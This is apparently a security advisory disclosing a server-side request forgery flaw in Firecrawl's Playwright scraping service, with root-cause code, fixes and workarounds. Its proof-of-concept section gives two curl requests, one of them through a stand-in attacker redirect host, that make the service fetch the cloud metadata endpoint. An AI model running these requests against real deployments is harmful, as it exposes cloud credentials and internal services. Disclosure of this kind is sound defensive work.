### Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in Firecrawl's Playwright microservice (`apps/playwright-service-ts/api.ts`). The service accepts arbitrary URLs — including those resolving to private and internal IP addresses — and navigates to them using Playwright's Chromium browser without any IP-based validation. This allows an attacker to read responses from internal services that should not be publicly accessible.

This vulnerability is a bypass of the existing SSRF protections applied for CVE-2024-56800 (GHSA-vjp8-2wgg-p734) and GHSA-p2wg-prhf-jx79, which added IP-based validation to the HTTP fetch engine and webhook delivery paths but did not extend those protections to the Playwright scraping path.

### Impact

An authenticated API user (or any user in self-hosted deployments without authentication enabled) can access internal services reachable from the Firecrawl server by submitting scrape requests that are processed by the Playwright engine. On cloud deployments, this could allow reading instance metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/`) to obtain IAM credentials or other sensitive cloud configuration data.

The Playwright microservice does not enforce any authentication on its own HTTP endpoint, so if its port is reachable (e.g., in misconfigured deployments or from adjacent containers in the same Docker network), it can be exploited directly without going through the API.

**Confirmed impact in a controlled self-hosted test environment:**

- Successfully retrieved the full HTML content of an internal RabbitMQ Management UI (`http://127.0.0.1:15672/`) via the Playwright service — 2,265 bytes returned including admin panel markup.
- Successfully retrieved the full HTML content of Firecrawl's own Bull Queue admin dashboard (`http://127.0.0.1:3002/admin/<key>/queues`) — 9,020 bytes returned.

### Root Cause

The API server implements SSRF protections in `apps/api/src/scraper/scrapeURL/engines/utils/safeFetch.ts` using `ipaddr.js` to check whether resolved IP addresses are private on each TCP `connect` event. However, when the Playwright engine is selected for scraping, this protection is bypassed entirely:

1. The API server calls `robustFetch()` (in `apps/api/src/scraper/scrapeURL/lib/fetch.ts`) to send the user-supplied URL to the Playwright microservice. This function does **not** use `getSecureDispatcher()`, so the `isIPPrivate()` check never applies to the target URL.
2. The Playwright microservice validates the URL using only JavaScript's `new URL()` constructor, which is a syntax check — not a security check:

```typescript
// apps/playwright-service-ts/api.ts — lines 153-160
const isValidUrl = (urlString: string): boolean => {
  try {
    new URL(urlString);  // Only checks URL syntax
    return true;
  } catch (_) {
    return false;
  }
};
```

3. The service then calls `page.goto(url)` with the user-supplied URL, allowing Chromium to navigate to any reachable host including private IP ranges.

### Proof of Concept

**1. Direct request to the Playwright microservice (if port 3000 is reachable):**

```bash
curl -X POST http://localhost:3000/scrape \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://169.254.169.254/latest/meta-data/", "timeout": 10000}'
```

The response JSON `content` field contains the full rendered HTML of the internal page.

**2. Via the API using an attacker-controlled redirect:**

An attacker hosts a redirect server at `http://attacker.com/redir` that responds with `302 Location: http://169.254.169.254/latest/meta-data/`. They then call:

```bash
curl -X POST http://localhost:3002/v1/scrape \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://attacker.com/redir", "formats": ["html"], "waitFor": 2000}'
```

The API's URL validation passes the external domain, and the Playwright browser follows the redirect to the metadata endpoint internally without any IP check.

### Patches

No patch is available yet. The recommended fix is to add IP-based validation to the Playwright microservice before calling `page.goto()`:

- Resolve the target hostname via DNS and check whether the resulting IP falls within private, loopback, or link-local ranges (reusing the existing `isIPPrivate()` logic from `safeFetch.ts`).
- Intercept redirect responses at the browser level using Playwright's `page.route()` API to validate each redirect destination before allowing navigation.

### Workarounds

If you cannot upgrade immediately:

- **Network isolation:** Place the Playwright microservice in an isolated network segment with no access to cloud metadata endpoints or internal management interfaces.
- **Firewall rules:** Block outbound connections from the Playwright container to private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`).
- **Do not expose port 3000:** Ensure the Playwright microservice port is not accessible from untrusted networks.

### References

- [GHSA-vjp8-2wgg-p734](https://github.com/firecrawl/firecrawl/security/advisories/GHSA-vjp8-2wgg-p734) — Prior SSRF fix (CVE-2024-56800) that this vulnerability bypasses
- [GHSA-p2wg-prhf-jx79](https://github.com/firecrawl/firecrawl/security/advisories/GHSA-p2wg-prhf-jx79) — Prior SSRF fix for webhooks
- Affected file: [`apps/playwright-service-ts/api.ts`](https://github.com/firecrawl/firecrawl/blob/main/apps/playwright-service-ts/api.ts) (lines 153–160, 221–262)
- CWE-918: Server-Side Request Forgery (SSRF)
